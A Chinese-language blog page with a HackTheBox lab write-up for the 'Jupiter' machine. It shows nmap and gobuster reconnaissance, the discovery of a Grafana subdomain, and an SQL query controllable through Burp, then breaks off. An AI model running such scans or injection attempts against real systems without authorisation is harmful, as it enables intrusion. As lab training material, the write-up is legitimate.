@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta name="referrer" content="no-referrer">
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Jupiter | Someb0dy&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="Nmap┌──(root💀kali)-[&#x2F;home&#x2F;kali&#x2F;hacktheboxtools] └─# nmap -A 10.10.11.216 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-05 11:21 EDT Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing">
+<meta name="keywords" content="Happy to Share,And Make friends">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jupiter">
+<meta property="og:url" content="someb0dy.github.io/2023/06/14/Jupiter/index.html">
+<meta property="og:site_name" content="Someb0dy&#39;s blog">
+<meta property="og:description" content="Nmap┌──(root💀kali)-[&#x2F;home&#x2F;kali&#x2F;hacktheboxtools] └─# nmap -A 10.10.11.216 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-06-05 11:21 EDT Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1685978612866-dc3658a3-5086-4f41-9e10-1fcb8e9868ae.png#averageHue=%230f0f0f&clientId=u218fbe62-9f53-4&from=paste&height=785&id=u86e96e8c&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=126645&status=done&style=none&taskId=ufba241e9-7fea-40dd-ad5e-fec9b949929&title=&width=1396.3636363636363">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1685979873911-5ae7f587-fc17-46b4-a4d0-69a6e963c9ba.png#averageHue=%235e766c&clientId=u218fbe62-9f53-4&from=paste&height=710&id=uad792255&originHeight=976&originWidth=1917&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=1793132&status=done&style=none&taskId=u6bc1b7f2-84c2-4973-94b3-2b33ef73ac6&title=&width=1394.1818181818182">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686040777300-ea39c795-bf51-4e3b-85de-4b27e0928853.png#averageHue=%23141414&clientId=u5d62c5cd-dafd-4&from=paste&height=116&id=u7cf8ef70&originHeight=159&originWidth=471&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=9193&status=done&style=none&taskId=ue935cbaa-eaa2-4bf7-9958-7712098496d&title=&width=342.54545454545456">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686043570071-cbbe7401-061f-49ac-8f5a-117883a63d63.png#averageHue=%23131313&clientId=u5d62c5cd-dafd-4&from=paste&height=719&id=ub4389a40&originHeight=988&originWidth=1482&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=118223&status=done&style=none&taskId=u2ff155f0-054c-458d-bc82-ca7330f6708&title=&width=1077.8181818181818">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686043676870-35d6cc6f-8958-41ec-85b4-358118097f36.png#averageHue=%23191919&clientId=u5d62c5cd-dafd-4&from=paste&height=412&id=u49b7c560&originHeight=566&originWidth=1059&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=78628&status=done&style=none&taskId=u86227ce7-daa1-47b7-bf75-5f6ddf89f10&title=&width=770.1818181818181">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686043933192-87fa2e68-fcf4-4331-8cb6-3000c7733eb6.png#averageHue=%23fcfcfb&clientId=u5d62c5cd-dafd-4&from=paste&height=702&id=uda6e6119&originHeight=965&originWidth=1920&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=83479&status=done&style=none&taskId=u1e58057a-27f5-4b0f-9629-bf2c3ab8217&title=&width=1396.3636363636363">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686043908327-1d5746cb-495d-4ec9-9782-6ce5fe583af5.png#averageHue=%23202020&clientId=u5d62c5cd-dafd-4&from=paste&height=571&id=hTKao&originHeight=785&originWidth=1900&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=352422&status=done&style=none&taskId=uc0b9ab28-5e67-47fd-8a53-3ab8ed168a1&title=&width=1381.8181818181818">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686045144307-2830af4c-6314-410e-a72d-b0efbde835fd.png#averageHue=%231c1c1c&clientId=udba77927-dfa2-4&from=paste&height=430&id=uf26c8745&originHeight=591&originWidth=1732&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=137968&status=done&style=none&taskId=u144a20f1-54a1-41b2-bb9e-7b01e7c5284&title=&width=1259.6363636363637">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686045148059-9ec39942-14e8-42c9-8a8d-0f62672d2657.png#averageHue=%23fdfcfc&clientId=udba77927-dfa2-4&from=paste&height=567&id=ufcc796ae&originHeight=780&originWidth=1814&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=64161&status=done&style=none&taskId=ub00b2e8d-9e34-47ef-afa3-de73a19ece2&title=&width=1319.2727272727273">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686045176088-ae488bc2-9b2a-40af-8dc0-1a87fc3d7024.png#averageHue=%23fcfcfc&clientId=udba77927-dfa2-4&from=paste&height=591&id=ucd72e823&originHeight=813&originWidth=1842&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=77452&status=done&style=none&taskId=ue7ae1ba3-25a5-4cd5-959b-ddabd01c6fe&title=&width=1339.6363636363637">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686045128399-ec878728-5fea-43ce-a5c7-c07f21c4e387.png#averageHue=%23f6f6f6&clientId=u2089c7bc-a14e-4&from=paste&height=646&id=ucb1ed0e5&originHeight=888&originWidth=1900&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=73798&status=done&style=none&taskId=ue814df3d-9976-41ae-8ac1-5acbb99b260&title=&width=1381.8181818181818">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686045454666-62aec7cc-698f-42a7-a7cc-744113179cce.png#averageHue=%23161616&clientId=udba77927-dfa2-4&from=paste&height=761&id=u2f4b5d9d&originHeight=1047&originWidth=1918&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=195756&status=done&style=none&taskId=ub8ab3ce9-8710-469b-8c1f-2e0fba40097&title=&width=1394.909090909091">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686047435784-4a465258-4838-499e-8446-7a784717b442.png#averageHue=%23171717&clientId=udba77927-dfa2-4&from=paste&height=87&id=u4b25e89f&originHeight=120&originWidth=746&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=17484&status=done&style=none&taskId=u4e290f43-db80-4cb5-970a-0e45ef9fd29&title=&width=542.5454545454545">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1686047483776-ce0d6c1e-1a4e-4262-9307-50383b59f3b5.png#averageHue=%231a1a1a&clientId=udba77927-dfa2-4&from=paste&height=146&id=u909230c7&originHeight=201&originWidth=728&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=31585&status=done&style=none&taskId=u0f8167f7-35e6-4740-bed6-bb3579e2c2b&title=&width=529.4545454545455">
+<meta property="og:updated_time" content="2023-06-06T11:04:43.997Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/33561677/1685978612866-dc3658a3-5086-4f41-9e10-1fcb8e9868ae.png#averageHue=%230f0f0f&clientId=u218fbe62-9f53-4&from=paste&height=785&id=u86e96e8c&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=126645&status=done&style=none&taskId=ufba241e9-7fea-40dd-ad5e-fec9b949929&title=&width=1396.3636363636363">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Someb0dy</h5>
+          <a href="mailto:1362460837@qq.com" target="_blank" rel="noopener" title="1362460837@qq.com" class="mail">1362460837@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Giraffe711" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Jupiter</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Jupiter</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-06-14T05:41:58.494Z" itemprop="datePublished" class="page-time">
+  2023-06-14
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">1.</span> <span class="post-toc-text">Nmap</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#主域名"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">主域名</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#根域名没啥功能点，暂时看上去，vhost-碰撞看看-96-96-96-c┌──-root💀kali-x2F-home-x2F-kali-x2F-hacktheboxtools-└─-gobuster-vhost-u-http-jupiter-htb-–append-domain-w-x2F-usr-x2F-share-x2F-SecLists-x2F-Discovery-x2F-DNS-x2F-subdomains-top1million-110000-txt-t-100"><span class="post-toc-number">2.</span> <span class="post-toc-text">根域名没啥功能点，暂时看上去，vhost 碰撞看看```c┌──(root💀kali)-[/home/kali/hacktheboxtools]└─# gobuster vhost -u http://jupiter.htb –append-domain -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Gobuster-v3-3by-OJ-Reeves-TheColonial-amp-Christian-Mehlmauer-firefart"><span class="post-toc-number">3.</span> <span class="post-toc-text">Gobuster v3.3by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Url-http-jupiter-htb-Method-GET-Threads-100-Wordlist-x2F-usr-x2F-share-x2F-SecLists-x2F-Discovery-x2F-DNS-x2F-subdomains-top1million-110000-txt-User-Agent-gobuster-x2F-3-3-Timeout-10s-Append-Domain-true"><span class="post-toc-number">4.</span> <span class="post-toc-text">[+] Url:             http://jupiter.htb[+] Method:          GET[+] Threads:         100[+] Wordlist:        /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt[+] User Agent:      gobuster/3.3[+] Timeout:         10s[+] Append Domain:   true</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#2023-x2F-06-x2F-05-11-25-42-Starting-gobuster-in-VHOST-enumeration-mode"><span class="post-toc-number">5.</span> <span class="post-toc-text">2023/06/05 11:25:42 Starting gobuster in VHOST enumeration mode</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Found-kiosk-jupiter-htb-Status-200-Size-34390-Progress-114441-x2F-114442-100-00-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-2023-x2F-06-x2F-05-11-41-33-Finished"><span class="post-toc-number">6.</span> <span class="post-toc-text">Found: kiosk.jupiter.htb Status: 200 [Size: 34390]Progress: 114441 / 114442 (100.00%)===============================================================2023/06/05 11:41:33 Finished</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ssh-公钥写入"><span class="post-toc-number">6.0.1.</span> <span class="post-toc-text">ssh 公钥写入</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#frp代理流量"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">frp代理流量</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权"><span class="post-toc-number">7.</span> <span class="post-toc-text">提权</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#总结"><span class="post-toc-number">8.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Jupiter"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Jupiter</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-06-14 13:41:58" datetime="2023-06-14T05:41:58.494Z"  itemprop="datePublished">2023-06-14</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><pre><code class="c">┌──(root💀kali)-[/home/kali/hacktheboxtools]
+└─# nmap -A 10.10.11.216
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 11:21 EDT
+Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.94% done; ETC: 11:22 (0:00:00 remaining)
+Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining)
+Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining)
+Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining)
+Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 99.29% done; ETC: 11:22 (0:00:00 remaining)
+Nmap scan report for 10.10.11.216
+Host is up (0.22s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA)
+|_  256 6001d7db927b13f0ba20c6c900a71b41 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://jupiter.htb/
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=6/5%OT=22%CT=1%CU=30597%PV=Y%DS=2%DC=T%G=Y%TM=647DFDB9
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%TS=B)SEQ(SP=10
+OS:1%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O3
+OS:=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=FE88%W2=F
+OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW
+OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 111/tcp)
+HOP RTT       ADDRESS
+1   270.35 ms 10.10.16.1
+2   176.97 ms 10.10.11.216
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 65.74 seconds
+</code></pre>
+<p>常见的两个端口22 和 80端口</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1685978612866-dc3658a3-5086-4f41-9e10-1fcb8e9868ae.png#averageHue=%230f0f0f&clientId=u218fbe62-9f53-4&from=paste&height=785&id=u86e96e8c&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=126645&status=done&style=none&taskId=ufba241e9-7fea-40dd-ad5e-fec9b949929&title=&width=1396.3636363636363" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>添加 &#x2F;etc&#x2F;hosts<br><strong>10.10.11.216 jupiter.htb</strong></p>
+<h2 id="主域名"><a href="#主域名" class="headerlink" title="主域名"></a>主域名</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1685979873911-5ae7f587-fc17-46b4-a4d0-69a6e963c9ba.png#averageHue=%235e766c&clientId=u218fbe62-9f53-4&from=paste&height=710&id=uad792255&originHeight=976&originWidth=1917&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=1793132&status=done&style=none&taskId=u6bc1b7f2-84c2-4973-94b3-2b33ef73ac6&title=&width=1394.1818181818182" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h1 id="根域名没啥功能点，暂时看上去，vhost-碰撞看看-96-96-96-c┌──-root💀kali-x2F-home-x2F-kali-x2F-hacktheboxtools-└─-gobuster-vhost-u-http-jupiter-htb-–append-domain-w-x2F-usr-x2F-share-x2F-SecLists-x2F-Discovery-x2F-DNS-x2F-subdomains-top1million-110000-txt-t-100"><a href="#根域名没啥功能点，暂时看上去，vhost-碰撞看看-96-96-96-c┌──-root💀kali-x2F-home-x2F-kali-x2F-hacktheboxtools-└─-gobuster-vhost-u-http-jupiter-htb-–append-domain-w-x2F-usr-x2F-share-x2F-SecLists-x2F-Discovery-x2F-DNS-x2F-subdomains-top1million-110000-txt-t-100" class="headerlink" title="根域名没啥功能点，暂时看上去，vhost 碰撞看看&#96;&#96;&#96;c┌──(root💀kali)-[&#x2F;home&#x2F;kali&#x2F;hacktheboxtools]└─# gobuster vhost -u http://jupiter.htb –append-domain -w &#x2F;usr&#x2F;share&#x2F;SecLists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-110000.txt -t 100"></a>根域名没啥功能点，暂时看上去，vhost 碰撞看看<br>&#96;&#96;&#96;c<br>┌──(root💀kali)-[&#x2F;home&#x2F;kali&#x2F;hacktheboxtools]<br>└─# gobuster vhost -u <a href="http://jupiter.htb/" target="_blank" rel="noopener">http://jupiter.htb</a> –append-domain -w &#x2F;usr&#x2F;share&#x2F;SecLists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-110000.txt -t 100</h1><h1 id="Gobuster-v3-3by-OJ-Reeves-TheColonial-amp-Christian-Mehlmauer-firefart"><a href="#Gobuster-v3-3by-OJ-Reeves-TheColonial-amp-Christian-Mehlmauer-firefart" class="headerlink" title="Gobuster v3.3by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)"></a>Gobuster v3.3<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</h1><h1 id="Url-http-jupiter-htb-Method-GET-Threads-100-Wordlist-x2F-usr-x2F-share-x2F-SecLists-x2F-Discovery-x2F-DNS-x2F-subdomains-top1million-110000-txt-User-Agent-gobuster-x2F-3-3-Timeout-10s-Append-Domain-true"><a href="#Url-http-jupiter-htb-Method-GET-Threads-100-Wordlist-x2F-usr-x2F-share-x2F-SecLists-x2F-Discovery-x2F-DNS-x2F-subdomains-top1million-110000-txt-User-Agent-gobuster-x2F-3-3-Timeout-10s-Append-Domain-true" class="headerlink" title="[+] Url:             http://jupiter.htb[+] Method:          GET[+] Threads:         100[+] Wordlist:        &#x2F;usr&#x2F;share&#x2F;SecLists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-110000.txt[+] User Agent:      gobuster&#x2F;3.3[+] Timeout:         10s[+] Append Domain:   true"></a>[+] Url:             <a href="http://jupiter.htb/" target="_blank" rel="noopener">http://jupiter.htb</a><br>[+] Method:          GET<br>[+] Threads:         100<br>[+] Wordlist:        &#x2F;usr&#x2F;share&#x2F;SecLists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-110000.txt<br>[+] User Agent:      gobuster&#x2F;3.3<br>[+] Timeout:         10s<br>[+] Append Domain:   true</h1><h1 id="2023-x2F-06-x2F-05-11-25-42-Starting-gobuster-in-VHOST-enumeration-mode"><a href="#2023-x2F-06-x2F-05-11-25-42-Starting-gobuster-in-VHOST-enumeration-mode" class="headerlink" title="2023&#x2F;06&#x2F;05 11:25:42 Starting gobuster in VHOST enumeration mode"></a>2023&#x2F;06&#x2F;05 11:25:42 Starting gobuster in VHOST enumeration mode</h1><h1 id="Found-kiosk-jupiter-htb-Status-200-Size-34390-Progress-114441-x2F-114442-100-00-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-2023-x2F-06-x2F-05-11-41-33-Finished"><a href="#Found-kiosk-jupiter-htb-Status-200-Size-34390-Progress-114441-x2F-114442-100-00-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-x3D-2023-x2F-06-x2F-05-11-41-33-Finished" class="headerlink" title="Found: kiosk.jupiter.htb Status: 200 [Size: 34390]Progress: 114441 &#x2F; 114442 (100.00%)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;2023&#x2F;06&#x2F;05 11:41:33 Finished"></a>Found: kiosk.jupiter.htb Status: 200 [Size: 34390]<br>Progress: 114441 &#x2F; 114442 (100.00%)&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>2023&#x2F;06&#x2F;05 11:41:33 Finished</h1><pre><code>
+## kiosk.jupiter.htb
+有一个**kiosk.jupiter.htb**的域名，加入到hosts文件中
+{% image https://cdn.nlark.com/yuque/0/2023/png/33561677/1685980099186-f13d5847-3a69-4795-bf0b-f0d1ed81b01b.png#averageHue=%231b1c22&clientId=u218fbe62-9f53-4&from=paste&height=683&id=uae2a9ea4&originHeight=939&originWidth=1915&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=160977&status=done&style=none&taskId=u10f908bc-7f16-4357-977d-4c9f7928fb1&title=&width=1392.7272727272727 'image.png' '' %}
+是一个grafana的应用
+{% image https://cdn.nlark.com/yuque/0/2023/png/33561677/1686019357889-a69a4742-9de5-4e7b-914a-cd01aa49ed1f.png#averageHue=%23a38b60&clientId=u5d62c5cd-dafd-4&from=paste&height=596&id=u099acf9e&originHeight=819&originWidth=1651&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=176711&status=done&style=none&taskId=ue38d9781-0008-4d2d-8ae7-fbf68371249&title=&width=1200.7272727272727 'image.png' '' %}
+bp看到历史记录中有这么一个包
+{% image https://cdn.nlark.com/yuque/0/2023/png/33561677/1686019382192-c2bbc03b-70e4-4bf7-8aff-f004f1bb87c8.png#averageHue=%232e2c2b&clientId=u5d62c5cd-dafd-4&from=paste&height=697&id=u54adbbc9&originHeight=958&originWidth=1481&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=89924&status=done&style=none&taskId=u2dc11d45-1dd2-43e5-ba78-ae27e9f7bb1&title=&width=1077.090909090909 'image.png' '' %}
+这里能控制sql语句
+{% image https://cdn.nlark.com/yuque/0/2023/png/33561677/1686019480637-0a66eb8f-a669-4ec3-82d8-60d2d416dc37.png#averageHue=%23202328&clientId=u5d62c5cd-dafd-4&from=paste&height=530&id=ua931a65c&originHeight=729&originWidth=1920&originalType=binary&ratio=1.375&rotation=0&showTitle=false&size=84072&status=done&style=none&taskId=u4bf75ae6-cee2-4c55-9a76-8e066a8c6f3&title=&width=1396.3636363636363 'image.png' '' %}这里能看到数据库的类型是PostgreSql 上hacktrick看看相关注入手法
